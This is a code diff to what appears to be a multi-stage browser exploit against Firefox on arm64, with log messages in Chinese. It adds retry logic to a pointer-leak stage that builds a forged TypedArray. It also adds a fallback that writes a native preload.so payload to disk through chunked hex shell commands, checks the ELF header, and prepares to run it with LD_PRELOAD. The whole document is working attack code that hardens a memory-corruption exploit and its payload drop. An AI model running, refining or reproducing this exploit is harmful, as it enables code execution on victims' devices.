@@ -652,6 +652,9 @@ async function main() {
   logInfo('目标: Firefox 151.0 arm64');
   logInfo('preload.so 大小: ' + preloadSoData.length + ' bytes');
 
+  const hexTable = new Array(256);
+  for (let i = 0; i < 256; i++) hexTable[i] = i.toString(16).padStart(2, '0');
+
   // ── Stage 1: Leak typed array shape/slots/elements ──
   logInfo('[1/7] 泄漏 TypedArray 内部指针...');
   await leakTypedWord(29, "prime");
@@ -671,16 +674,32 @@ async function main() {
 
   // ── Stage 2: Leak carrier object and set up fake object ──
   logInfo('[2/7] 分配 Carrier 对象并构造伪造 TypedArray...');
-  await leakCarrierWord(29);
-  const carrierSlots = await leakCarrierWord(30);
+
+  let carrierSlots = 0n;
+  const CARRIER_LEAK_MAX = 5;
+  for (let attempt = 1; attempt <= CARRIER_LEAK_MAX; attempt++) {
+    await leakCarrierWord(29);
+    carrierSlots = await leakCarrierWord(30);
+    dbgLog('[Stage2] carrierSlots attempt ' + attempt + '/' + CARRIER_LEAK_MAX + ' = 0x' + carrierSlots.toString(16));
+    if (isLikelyUserPtr(carrierSlots)) {
+      logOk('carrier_slots=0x' + carrierSlots.toString(16) + ' (attempt ' + attempt + ')');
+      break;
+    }
+    logWarn('carrier 泄漏值无效 (0x' + carrierSlots.toString(16) + '), 重试 ' + attempt + '/' + CARRIER_LEAK_MAX);
+    if (attempt === CARRIER_LEAK_MAX) {
+      logErr('carrier 泄漏连续 ' + CARRIER_LEAK_MAX + ' 次失败');
+      dbgDump('Stage2 carrier 泄漏失败', { lastValue: '0x' + carrierSlots.toString(16), typedShape: '0x' + typedShape.toString(16) });
+      quit(23);
+    }
+    await yieldJit();
+  }
+
   const fakeObject = carrierSlots;
   const writeTarget = carrierSlots + 8n * 8n;
-  requireUserPtr(carrierSlots, 23);
   requireUserPtr(fakeObject, 24);
   requireUserPtr(writeTarget, 25);
   requireAlignedPtr(carrierSlots, 0xfn, 38);
   forgedObjectAddress = fakeObject;
-  logOk('carrier_slots=0x' + carrierSlots.toString(16));
   logOk('fake_object=0x' + fakeObject.toString(16));
   dbgDump('Stage2 Carrier', { carrierSlots, fakeObject, writeTarget, CARRIER_FIXED_SLOTS });
 
@@ -1201,6 +1220,70 @@ async function main() {
   const verifiedSize = verifyResult.output.trim();
   logInfo('文件大小验证: ' + verifiedSize + ' bytes');
   dbgDump('Stage7 文件验证', { expected: preloadSoData.length, actual: verifiedSize, match: String(preloadSoData.length) === verifiedSize });
+  await delay();
+
+  // Verify ELF magic content (not just size)
+  const magicCheck = runCaptureCommand(
+    "file=" + shellQuote(PRELOAD_TARGET) +
+      "; /system/bin/xxd -l 4 -p \"$file\" 2>/dev/null" +
+      " || /system/bin/head -c 4 \"$file\" | /system/bin/od -An -tx1 | /system/bin/tr -d ' '",
+    99
+  );
+  const readMagic = magicCheck.output.trim().replace(/\s/g, '').toLowerCase();
+  dbgLog('[Stage7] 文件头部 magic: ' + readMagic);
+  const expectedMagic = '7f454c46';
+
+  if (readMagic !== expectedMagic) {
+    logWarn('base64 写入验证失败 (magic=' + readMagic + '), 尝试 hex 编码重写...');
+    dbgDump('Stage7 base64 写入内容错误', { expected: expectedMagic, actual: readMagic, fileSize: verifiedSize });
+
+    // Rewrite using hex encoding (xxd -r -p)
+    runCaptureCommand(
+      "file=" + shellQuote(PRELOAD_TARGET) + "; : > \"$file\"", 99
+    );
+    let hexTotal = 0;
+    const HEX_CHUNK = 2048;
+    for (let offset = 0; offset < preloadSoData.length; offset += HEX_CHUNK) {
+      const end = Math.min(offset + HEX_CHUNK, preloadSoData.length);
+      const chunk = preloadSoData.subarray(offset, end);
+      let hex = '';
+      for (let i = 0; i < chunk.length; i++) {
+        hex += hexTable[chunk[i]];
+      }
+      const hexResult = runCaptureCommand(
+        "file=" + shellQuote(PRELOAD_TARGET) +
+          "; /system/bin/printf %s " + shellQuote(hex) +
+          " | /system/bin/xxd -r -p >> \"$file\"" +
+          " && /system/bin/printf OK || /system/bin/printf FAIL",
+        99
+      );
+      if (hexResult.output.indexOf("OK") !== 0) {
+        logErr('hex 写入块失败');
+        quit(53);
+      }
+      hexTotal += (end - offset);
+      logRaw('  hex 重写进度: ' + hexTotal + '/' + preloadSoData.length);
+      await delay();
+    }
+
+    // Re-verify after hex rewrite
+    const reCheck = runCaptureCommand(
+      "file=" + shellQuote(PRELOAD_TARGET) +
+        "; /system/bin/xxd -l 4 -p \"$file\" 2>/dev/null" +
+        " || /system/bin/head -c 4 \"$file\" | /system/bin/od -An -tx1 | /system/bin/tr -d ' '",
+      99
+    );
+    const reMagic = reCheck.output.trim().replace(/\s/g, '').toLowerCase();
+    dbgLog('[Stage7] hex 重写后 magic: ' + reMagic);
+    if (reMagic !== expectedMagic) {
+      logErr('hex 重写后仍然无效 (magic=' + reMagic + ')');
+      dbgDump('Stage7 hex 重写也失败', { expected: expectedMagic, actual: reMagic });
+      quit(54);
+    }
+    logOk('hex 编码重写验证通过');
+  } else {
+    logOk('ELF magic 内容验证通过');
+  }
   await delay();
 
   // Execute with LD_PRELOAD
